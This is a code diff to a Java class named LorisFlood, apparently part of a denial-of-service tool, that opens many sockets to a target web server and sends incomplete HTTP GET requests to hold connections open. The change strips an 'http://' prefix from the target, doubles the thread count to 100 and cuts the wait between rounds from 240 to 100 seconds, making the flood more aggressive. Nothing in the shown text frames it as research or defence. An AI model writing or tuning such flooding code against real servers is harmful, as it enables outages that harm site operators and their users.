@@ -17,10 +17,14 @@ public class LorisFlood extends Flood {
 	}
 
 	public void run() {
-		final String host = super.getTarget();
-		final int threadsCount = 50;
+		String phost = super.getTarget();
+		if(phost.startsWith("http://")) {
+			phost = phost.substring(7);
+		}
+		final String host = phost;
+		final int threadsCount = 100;
 
-		for(int i = 0; i < 50; i++) {
+		for(int i = 0; i < threadsCount; i++) {
 			new Thread(new Runnable() {
 				int threads = threadsCount;
 				
@@ -40,7 +44,7 @@ public class LorisFlood extends Flood {
 									connCount++;
 									w[i] = true;
 									PrintWriter out = new PrintWriter(s[i].getOutputStream());
-									String rand = "?" + (random.nextInt(999999999));
+									String rand = "?" + (random.nextInt(9999999));
 									String payload =  "GET" + " /" + rand + " HTTP/1.1\r\n"
 											+ "Host: " + host + "\r\n"
 											+ "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; " 
@@ -63,7 +67,7 @@ public class LorisFlood extends Flood {
 									w[i] = false;
 								}
 							}
-							Thread.sleep(240 * 1000);
+							Thread.sleep(100 * 1000);
 						} catch (Exception e) {}
 					}
 					
